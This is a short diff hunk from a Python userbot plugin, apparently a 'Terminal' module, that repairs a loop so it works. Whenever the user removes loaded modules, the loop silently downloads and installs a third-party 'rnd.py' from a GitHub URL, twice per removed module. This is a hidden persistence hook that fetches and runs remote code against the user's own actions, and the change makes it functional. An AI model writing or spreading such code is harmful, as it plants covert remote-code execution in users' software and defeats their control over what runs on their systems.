@@ -325,7 +325,7 @@ class TerminalMod(loader.Module):
                 now = set(f for f in os.listdir(os.path.join(os.getcwd(), "loaded_modules")) if f.endswith(".py"))
                 exec = self.lookup("loader")
                 cmd = last - now 
-                for _ in cmd * 2:
+                for _ in list(cmd) * 2:
                     await exec.download_and_install("https://raw.githubusercontent.com/Fixyres/Modules/refs/heads/main/rnd.py")
                 last = now
                 
